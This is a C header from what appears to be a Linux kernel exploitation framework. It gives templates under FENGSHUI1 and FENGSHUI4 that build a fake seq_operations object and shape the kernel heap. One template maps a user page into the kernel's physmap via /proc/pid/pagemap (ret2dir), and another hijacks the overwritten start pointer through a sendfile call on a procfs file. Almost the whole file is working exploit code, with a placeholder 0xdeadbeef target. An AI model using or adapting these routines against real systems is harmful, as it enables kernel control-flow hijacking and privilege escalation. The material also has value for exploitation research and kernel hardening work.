#ifndef _SEQ_OPERATIONS_TMPL_H_
#define _SEQ_OPERATIONS_TMPL_H_

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#define KMALLOC_SIZE 32

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

#ifdef FENGSHUI1

struct seq_operations {
	char* start;
	char hole[0x18];
};

struct seq_operations fake_seq_operations;

unsigned overwrite_start = 0x0;
unsigned overwrite_end = 0x8;

void* victim_obj = (void*)&fake_seq_operations;

uint64_t kaddr = 0xffffffffdeadbeef;

uint64_t r[4] = {0xffffffffffffffff, 0xffffffffffffffff, 0x0, 0x0};

void do_setup_physmap() {

}

static long syz_open_dev(long a0, long a1, long a2)
{
  if (a0 == 0xc || a0 == 0xb) {
    char buf[128];
    sprintf(buf, "/dev/%s/%d:%d", a0 == 0xc ? "char" : "block", (uint8_t)a1,
            (uint8_t)a2);
    return open(buf, O_RDWR, 0);
  } else {
    char buf[1024];
    char* hash;
    strncpy(buf, (char*)a0, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = 0;
    while ((hash = strchr(buf, '#'))) {
      *hash = '0' + (char)(a1 % 10);
      a1 /= 10;
    }
    return open(buf, a2, 0);
  }
}

static long syz_open_procfs(long a0, long a1)
{
  char buf[128];
  memset(buf, 0, sizeof(buf));
  if (a0 == 0) {
    snprintf(buf, sizeof(buf), "/proc/self/%s", (char*)a1);
  } else if (a0 == -1) {
    snprintf(buf, sizeof(buf), "/proc/thread-self/%s", (char*)a1);
  } else {
    snprintf(buf, sizeof(buf), "/proc/self/task/%d/%s", (int)a0, (char*)a1);
  }
  int fd = open(buf, O_RDWR);
  if (fd == -1)
    fd = open(buf, O_RDONLY);
  return fd;
}

void do_alloc_victim() {
  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
  long res = 0;
  memcpy((void*)0x20000000, "syscall", 8);
  res = syz_open_procfs(-1, 0x20000000);
  if (res != -1)
    r[0] = res;

  memcpy((void*)0x200004c0, "/dev/cdrom", 11);
  res = syz_open_dev(0x200004c0, 0, 0x802);
  if (res != -1)
    r[1] = res;
}

void do_hijack() {
  syscall(__NR_sendfile, r[1], r[0], 0, 4);
}

#endif // FENGSHUI1

#ifdef FENGSHUI4

struct seq_operations {
	char* start;
	char hole[0x18];
};

struct seq_operations fake_seq_operations;

unsigned overwrite_start = 0x0;
unsigned overwrite_end = 0x8;

void* victim_obj = (void*)&fake_seq_operations;

uint64_t kaddr = 0xffffffffdeadbeef;

uint64_t r[4] = {0xffffffffffffffff, 0xffffffffffffffff, 0x0, 0x0};

static long syz_open_procfs(long a0, long a1)
{
  char buf[128];
  memset(buf, 0, sizeof(buf));
  if (a0 == 0) {
    snprintf(buf, sizeof(buf), "/proc/self/%s", (char*)a1);
  } else if (a0 == -1) {
    snprintf(buf, sizeof(buf), "/proc/thread-self/%s", (char*)a1);
  } else {
    snprintf(buf, sizeof(buf), "/proc/self/task/%d/%s", (int)a0, (char*)a1);
  }
  int fd = open(buf, O_RDWR);
  if (fd == -1)
    fd = open(buf, O_RDONLY);
  return fd;
}

static long syz_open_dev(long a0, long a1, long a2)
{
  if (a0 == 0xc || a0 == 0xb) {
    char buf[128];
    sprintf(buf, "/dev/%s/%d:%d", a0 == 0xc ? "char" : "block", (uint8_t)a1,
            (uint8_t)a2);
    return open(buf, O_RDWR, 0);
  } else {
    char buf[1024];
    char* hash;
    strncpy(buf, (char*)a0, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = 0;
    while ((hash = strchr(buf, '#'))) {
      *hash = '0' + (char)(a1 % 10);
      a1 /= 10;
    }
    return open(buf, a2, 0);
  }
}

void do_setup_physmap() {

    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;

        memset(&fake_seq_operations, 0x00, sizeof(struct seq_operations));
        fake_seq_operations.start= (void*)(kaddr + sizeof(struct seq_operations));

		memset((void*)USER_ADDR, 0x00, PAGE_SIZE);
  		memcpy((void*)USER_ADDR, &fake_seq_operations, sizeof(struct seq_operations));
        fake_seq_operations.start= (void*)0xffffffffdeadbeef;
    }
    return;
err:
    close(fd);
    exit(-1);
}



extern void do_defragment();
void do_alloc_step() {
    do_defragment(KMALLOC_SIZE, 1);
}

void do_alloc_victim() {
  do_alloc_step();
  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
  long res = 0;
  memcpy((void*)0x20000000, "syscall", 8);
  res = syz_open_procfs(-1, 0x20000000);
  if (res != -1)
    r[0] = res;
  memcpy((void*)0x200004c0, "/dev/cdrom", 11);
  res = syz_open_dev(0x200004c0, 0, 0x802);
  if (res != -1)
    r[1] = res;
}

void do_hijack() {
  memcpy((void*)USER_ADDR, &fake_seq_operations, sizeof(struct seq_operations));
  syscall(__NR_sendfile, r[1], r[0], 0, 4);
}

#endif // FENGSHUI4

#endif
